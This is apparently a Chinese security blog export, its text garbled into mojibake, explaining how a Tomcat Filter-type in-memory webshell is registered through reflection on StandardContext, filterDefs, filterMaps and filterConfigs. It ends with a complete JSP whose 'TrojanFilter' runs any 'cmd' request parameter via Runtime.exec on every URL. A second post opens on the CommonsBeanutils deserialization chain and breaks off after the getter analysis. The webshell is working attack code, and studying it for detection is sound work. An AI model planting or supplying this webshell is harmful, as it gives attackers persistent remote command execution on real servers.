<h1 id="Tomcatæ³¨å†ŒFilteræµç¨‹"><a href="#Tomcatæ³¨å†ŒFilteræµç¨‹" class="headerlink" title="Tomcatæ³¨å†ŒFilteræµç¨‹"></a>Tomcatæ³¨å†ŒFilteræµç¨‹</h1><p>åœ¨<code>configureContext</code>æ–¹æ³•ä¸­ï¼Œå…³äºFilterçš„æ“ä½œå…¶å®å°±è¿™äº›</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806130044069.png" alt="image-20240806130044069"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;      <span class="hljs-comment">//æŠŠxmlæ–‡ä»¶è¯»å‡ºæ¥ï¼Œç±»å‹ä¸ºFilterDef </span><br>    <span class="hljs-keyword">if</span> (filter.getAsyncSupported() == <span class="hljs-literal">null</span>) &#123;				<span class="hljs-comment">//å¼‚æ­¥æ”¯æŒï¼Œä¸é‡è¦</span><br>        filter.setAsyncSupported(<span class="hljs-string">&quot;false&quot;</span>);<br>    &#125;<br>    context.addFilterDef(filter); 							<span class="hljs-comment">//æ·»åŠ åˆ°contexté‡Œé¢</span><br>&#125;<br><br><span class="hljs-keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;    <span class="hljs-comment">//æŠŠxmlæ˜ å°„è¯»å‡ºæ¥ï¼Œç±»å‹ä¸ºFilterMap</span><br>    context.addFilterMap(filterMap);						<span class="hljs-comment">//æ·»åŠ åˆ°contexté‡Œé¢</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…¶å®å°±æ˜¯å¯¹åº”xmlæ–‡ä»¶çš„é…ç½®</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806130524241.png" alt="image-20240806130524241"></p>
<p>é‚£æˆ‘ä»¬æ³¨æ„å®ç°<code>context.addFilterDef(filter);</code>å’Œ<code>context.addFilterMap(filterMap);</code>å°±å¯ä»¥äº†</p>
<hr>
<p>ä¹Ÿå°±æ˜¯è¯´åˆ°ç›®å‰ä¸ºæ­¢æƒ³æŠŠæ¶æ„çš„Filteræ³¨å†Œåˆ°tomcatéœ€è¦å®ç°çš„æ˜¯</p>
<p>1.è·å–ä¸€ä¸ª<code>ServletContext</code>å¯¹è±¡</p>
<p>2.å®ç°<code>context.addFilterDef(filter) </code>#å°†Filterå®ä¾‹åŒ–å¯¹è±¡æ·»åŠ åˆ°StandardContexté‡Œé¢</p>
<p>3.å®ç°<code>context.addFilterMap(filterMap) </code> #å°†Filteræ˜ å°„å…³ç³»æ·»åŠ åˆ°StandardContexté‡Œé¢</p>
<h1 id="æ³¨å†Œæ¶æ„Filteråˆ°tomcat"><a href="#æ³¨å†Œæ¶æ„Filteråˆ°tomcat" class="headerlink" title="æ³¨å†Œæ¶æ„Filteråˆ°tomcat"></a>æ³¨å†Œæ¶æ„Filteråˆ°tomcat</h1><p><code>FilterDef</code>æœ‰å¯¹åº”çš„getterå’Œsetteræ–¹æ³• ï¼Œé‚£è¿™æ ·å­çš„è¯å°±å¯ä»¥ç›´æ¥ç”¨setæ–¹æ³•æ¥æ³¨å†Œæˆ‘ä»¬çš„æ¶æ„Filter</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806130937461.png" alt="image-20240806130937461"></p>
<p><code>FilterMap</code>æœ‰å¯¹åº”çš„getterå’Œsetteræ–¹æ³• ï¼Œå¯ä»¥ç›´æ¥ç”¨setæ–¹æ³•æ¥æ³¨å†Œæˆ‘ä»¬çš„æ¶æ„Filteræ˜ å°„</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806131119841.png" alt="image-20240806131119841"></p>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åŠ¨æ€æ³¨å†ŒFilter</span><br><span class="hljs-comment">//1.è·å–context</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br><br>  <span class="hljs-comment">//2.å®ç°context.addFilterDef(filterDef);</span><br>  <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>  filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TrojanFilter</span>());<br>  filterDef.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterDef.setFilterClass(TrojanFilter.class.getName());<br>  context.addFilterDef(filterDef);<br><br>  <span class="hljs-comment">//3.å®ç°context.addFilterMap(filterMap);</span><br>  <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>  filterMap.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>  context.addFilterMap(filterMap);<br></code></pre></td></tr></table></figure>



<h2 id="Filterå†…å­˜é©¬ä¸èƒ½æˆåŠŸè¿è¡Œ"><a href="#Filterå†…å­˜é©¬ä¸èƒ½æˆåŠŸè¿è¡Œ" class="headerlink" title="Filterå†…å­˜é©¬ä¸èƒ½æˆåŠŸè¿è¡Œ"></a>Filterå†…å­˜é©¬ä¸èƒ½æˆåŠŸè¿è¡Œ</h2><p>ä½†æ˜¯ä¼šå‘ç°å•Šï¼Œè¿™æ ·å­å¹¶ä¸èƒ½æˆåŠŸè¿è¡Œï¼Œæ’æŸ¥äº†å¥½ä¹…ã€‚ç›´åˆ°çœ‹åˆ°Y4å¸ˆå‚…çš„æ–‡ç« æåˆ°äº†è¿™ä¸ªæ–¹æ³•</p>
<p><code>org.apache.catalina.core.StandardContext#filterStart</code></p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806131609599.png" alt="image-20240806131609599"></p>
<p>è®©æˆ‘ä»¬åœ¨initæ‰“ä¸Šæ–­ç‚¹ï¼Œæ‰¾åˆ°<code>filterStart</code>è¿™ä¸ªç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue())<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>this</code>å°±æ˜¯<code>StandardContext</code>ï¼Œ<code>entry.getValue()</code>å°±æ˜¯<code>FilterDef</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™æ®µä»£ç æŠŠ<code>StandardContex</code>tå’Œ<code>FilterDef</code>å°è£…æˆäº†<code>ApplicationFilterConfig</code>ç±»å‹,åå­—å«filterConfig</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806132047040.png" alt="image-20240806132047040"></p>
<p>ç„¶åçœ‹åˆ°ä¸‹ä¸€è¡Œ</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">filterConfigs.<span class="hljs-keyword">put</span>(<span class="hljs-built_in">name</span>, filterConfig);<br></code></pre></td></tr></table></figure>

<p>å…³æ³¨åˆ°<code>filterConfigs</code>ï¼Œç‚¹è¿›<code>filterConfigs</code>ï¼Œå…¶å®æ˜¯ä¸€ä¸ªHashMapï¼ŒæŠŠ<code>filteråå­—</code>å’Œåˆšåˆšåˆ›å»ºçš„<code>filterConfig</code>ï¼Œputè¿›<code>filterConfigs</code>é‡Œé¢ã€‚è€Œä¸”æ›´åº”è¯¥å…³æ³¨çš„æ˜¯<code>filterConfigs</code>å…¶å®<code>StandardContext</code>çš„ä¸€ä¸ªå±æ€§ï¼Œç›´æ¥ç”¨åå°„å¯ä»¥ä¿®æ”¹ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806132533105.png" alt="image-20240806132533105"></p>
<p>æ‰€ä»¥ç°åœ¨éœ€è¦å®ç°çš„ç›®æ ‡æ˜¯</p>
<ol>
<li><code>ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, entry.getValue());</code> #å°†StandardContextå’ŒFilterDefå°è£…æˆApplicationFilterConfigç±»å‹</li>
<li><code>filterConfigs.put(name, filterConfig); </code>#å°†æˆ‘ä»¬å°è£…å¥½çš„filterConfig putåˆ°filterConfigsé‡Œé¢</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//å°è£…filterDefä¸ºApplicationFilterConfigç±»çš„å¯¹è±¡</span><br>Constructor <span class="hljs-keyword">constructor</span> = ApplicationFilterConfig.<span class="hljs-keyword">class</span>.getDeclaredConstructor(Context.<span class="hljs-keyword">class</span>,FilterDef.<span class="hljs-keyword">class</span>);<br><span class="hljs-keyword">constructor</span>.setAccessible(<span class="hljs-literal">true</span>);<br>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="hljs-keyword">constructor</span>.newInstance(context,filterDef);<br><br><span class="hljs-comment">//åœ¨contextå¯¹è±¡çš„filterConfigså±æ€§ä¸­æ·»åŠ ä¸Šæˆ‘ä»¬æ„é€ å¥½çš„ApplicationFilterConfigç±»çš„å¯¹è±¡</span><br>Field Configs = context.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-literal">true</span>);<br>Map filterConfigs = (Map) Configs.<span class="hljs-keyword">get</span>(context);<br>filterConfigs.put(<span class="hljs-string">&quot;TrojanFilter&quot;</span>,filterConfig);<br></code></pre></td></tr></table></figure>



<h1 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h1><p>é‚£æ€»ç»“ä¸€ä¸‹å®ç°filterå†…å­˜é©¬ï¼Œæ€»è¿‡æœ‰äº”æ­¥</p>
<p>1.è·å–ä¸€ä¸ª<code>ServletContext</code>å¯¹è±¡</p>
<p>2.å®ç°<code>context.addFilterDef(filter) </code>#å°†Filterå®ä¾‹åŒ–å¯¹è±¡æ·»åŠ åˆ°StandardContexté‡Œé¢</p>
<p>3.å®ç°<code>context.addFilterMap(filterMap) </code> #å°†Filteræ˜ å°„å…³ç³»æ·»åŠ åˆ°StandardContexté‡Œé¢<br>4.å®ç°<code>ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, entry.getValue());</code> #å°†StandardContextå’ŒFilterDefå°è£…æˆApplicationFilterConfigç±»å‹</p>
<p>5.å®ç°<code>filterConfigs.put(name, filterConfig);</code> #å°†æˆ‘ä»¬å°è£…å¥½çš„filterConfig putåˆ°filterConfigsé‡Œé¢</p>
<p>éšåä¾¿æ˜¯tomcat filteræµç¨‹</p>
<ol>
<li>é¦–å…ˆæ˜¯ invoke() æ–¹æ³•</li>
</ol>
<p>å±‚å±‚è°ƒç”¨ç®¡é“ï¼Œåœ¨æœ€åä¸€ä¸ªç®¡é“çš„åœ°æ–¹ä¼šåˆ›å»ºä¸€ä¸ªé“¾å­ï¼Œè¿™ä¸ªé“¾å­æ˜¯ FilterChainï¼Œå†å¯¹é‡Œå¤´çš„ filter è¿›è¡Œä¸€äº›ç›¸å…³çš„åŒ¹é…ã€‚</p>
<ol start="2">
<li>filterchain æ‹¿å‡ºæ¥ä¹‹å</li>
</ol>
<p>è¿›è¡Œ <code>doFilter()</code> å·¥ä½œï¼Œå°†è¯·æ±‚äº¤ç»™å¯¹åº”çš„ pipeline å»å¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œä¸€ä¸ª <code>doFilter()</code> â€”-&gt; <code>internalDoFilter()</code> â€”-&gt; <code>doFilter()</code>ï¼›ç›´åˆ°æœ€åä¸€ä¸ª filter è¢«è°ƒç”¨ã€‚</p>
<ol start="3">
<li>æœ€åä¸€ä¸ª filter</li>
</ol>
<p>æœ€åä¸€ä¸ª filter ä¼šæ‰§è¡Œå®Œ <code>doFilter()</code> æ“ä½œï¼Œéšåä¼šè·³è½¬åˆ° <code>Servlet.service()</code> è¿™é‡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrojanFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>      <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>));<br>             <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(response.getOutputStream(),<span class="hljs-string">&quot;GBK&quot;</span>))) &#123;<br><br>          printWriter.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><br>          String line;<br>          <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            printWriter.println(line);<br>          &#125;<br><br>          printWriter.write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>          printWriter.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>          e.printStackTrace();<br>        &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// ç»§ç»­è¿‡æ»¤é“¾</span><br>        chain.doFilter(request, response);<br>      &#125;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>  &#125;<br>%&gt;<br><br><br>&lt;%<br>  <span class="hljs-comment">//åŠ¨æ€æ³¨å†ŒFilter</span><br>  <span class="hljs-comment">//1.è·å–context</span><br>  <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>  <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>  applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br><br>  <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>  standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>  <span class="hljs-comment">//2.addFilterDef</span><br>  <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>  filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TrojanFilter</span>());<br>  filterDef.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterDef.setFilterClass(TrojanFilter.class.getName());<br>  context.addFilterDef(filterDef);<br><br>  <span class="hljs-comment">//3.addFilterMap</span><br>  <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>  filterMap.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>  context.addFilterMap(filterMap);<br><br>  <span class="hljs-comment">//4.å°è£…filterDefä¸ºApplicationFilterConfigç±»çš„å¯¹è±¡</span><br>  <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>  constructor.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context,filterDef);<br><br>  <span class="hljs-comment">//5.åœ¨contextå¯¹è±¡çš„filterConfigså±æ€§ä¸­æ·»åŠ ä¸Šæˆ‘ä»¬æ„é€ å¥½çš„ApplicationFilterConfigç±»çš„å¯¹è±¡</span><br>  <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> context.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>  Configs.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(context);<br>  filterConfigs.put(<span class="hljs-string">&quot;TrojanFilter&quot;</span>,filterConfig);<br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>



<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://www.bilibili.com/video/BV1E84y1w77R/?share_source=copy_web&vd_source=69bbab612e2d116c463ccdb5d55ddce6">javaå†…å­˜é©¬ä¸“é¢˜1-servletå†…å­˜é©¬</a></p>
<p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md">Tomcat-Filterå‹å†…å­˜é©¬</a></p>
<p><a href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B">Javaå†…å­˜é©¬ç³»åˆ—-03-Tomcat ä¹‹ Filter å‹å†…å­˜é©¬</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsBeanutilsé“¾</title>
    <url>/2024/06/08/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CB%E9%93%BE/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code> CommonsBeanutils</code>å±äº<code>Apache Commons </code>å·¥å…·é›†ä¸‹çš„ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒå’Œ<code>Commons-Collections</code>å¾ˆåƒï¼Œä¹Ÿæ˜¯å¯¹JAVAå†…ç½®åŠŸèƒ½çš„åŠ å¼ºï¼ŒCCæ˜¯å¯¹JAVAé›†åˆç±»çš„å¢å¼ºï¼ŒCBæ˜¯å¯¹<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a>çš„åŠ å¼ºã€‚</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shello">&lt;dependencies&gt;<br>       &lt;dependency&gt;<br>           &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br>           &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br>           &lt;version&gt;1.9.2&lt;/version&gt;<br>       &lt;/dependency&gt;<br> &lt;dependencies&gt;      <br></code></pre></td></tr></table></figure>

<h3 id="getterå’Œsetter"><a href="#getterå’Œsetter" class="headerlink" title="getterå’Œsetter"></a>getterå’Œsetter</h3><p>æ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹å®é™…çš„äº†è§£ä¸€ä¸‹ï¼Œä¸‹é¢ä»£ç å®šä¹‰äº†ä¸€ä¸ª Personç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;Sp4rks3&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨è¯¥ç±»ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªç§æœ‰å±æ€§<code>name</code>å’Œä¸¤ä¸ªæ–¹æ³•ï¼šè¯»å–<code>name</code>å’Œè®¾ç½®<code>name</code>ã€‚åœ¨ Java ä¸­ï¼Œæˆ‘ä»¬æŠŠç¬¦åˆé©¼å³°å¼å‘½åæ³•ï¼Œä»¥ get å¼€å¤´çš„æ–¹æ³•åå«åš<code>getter</code>ï¼Œä»¥ set å¼€å¤´çš„æ–¹æ³•åå«åš<code>setter</code>ã€‚</p>
<p><code>CommonsBeanutils</code>ä¸ºå¼€å‘äººå‘˜æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼š<code>PropertyUtils.getProperty()</code>ï¼Œé€šè¿‡è¯¥æ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„<code>JavaBean</code>ä¸­çš„<code>getter()</code>æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç è°ƒç”¨ User ç±»çš„<code>getName()</code>æ–¹æ³•è·å– username çš„å€¼ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(),<span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure>

<p>ç›¸å½“äºæˆ‘ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒå°±ä¼šåŠ¨æ€çš„æ‰§è¡Œå‡½æ•°ï¼Œè¿™æ ·å°±ä¼šè®©æˆ‘ä»¬æƒ³åˆ°ä¼šä¸ä¼šæœ‰å®‰å…¨é—®é¢˜</p>
<hr>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-06-07%20104831.png" alt="2024-06-07 104831"></p>
<p>æˆ‘ä»¬ä¼ å…¥çš„æ˜¯ <code>name</code>ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯getteæ–¹æ³•å’Œsetteræ–¹æ³•çš„åå­— è¿˜è¿”å›äº†Beançš„å±æ€§å€¼çš„åå­—ã€‚</p>
<p>(å¤§å†™çš„<code>Name</code>ï¼Œå®é™…æ˜¯<code>javabean</code>çš„é»˜è®¤æ ¼å¼ï¼Œå°±æ˜¯ä¼ è¿›æ¥å°å†™ï¼Œä½†æ˜¯ä¼šå°†ç¬¬ä¸€ä¸ªå­—æ¯å˜ä¸ºå¤§å†™ï¼Œå˜ä¸º<code>Name</code>)</p>
<hr>
<p><code>PropertyUtilsBean</code>ä¸­çœ‹åˆ°äº†è°ƒç”¨çš„åœ°æ–¹ï¼Œæ„æ€å°±æ˜¯å¯¹æˆ‘ä»¬ä¼ é€’çš„å¯¹è±¡ï¼Œè°ƒç”¨ä¸€ä¸ªç¬¦åˆJavaBeançš„æ–¹æ³•(getteræ–¹æ³•)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214037301.png" alt="image-20240606214037301"></p>
<h2 id="CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ"><a href="#CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ"></a>CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ</h2><p>CC3ä¸­æåˆ°äº†<code>Templateslmpl</code>ç±»ï¼Œå®ƒé‡Œé¢æœ‰<code>getOutputProperties()</code>æ–¹æ³•,è€Œ<code>getOutputProperties()</code>åå­—æ­£å¥½æ»¡è¶³getteræ–¹æ³•çš„å®šä¹‰ä¸”<code>newTransformer()</code>æ˜¯å¯ä»¥åŠ¨æ€åŠ è½½ç±»çš„</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214356953.png" alt="image-20240606214356953"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214757835.png" alt="image-20240606214757835"></p>
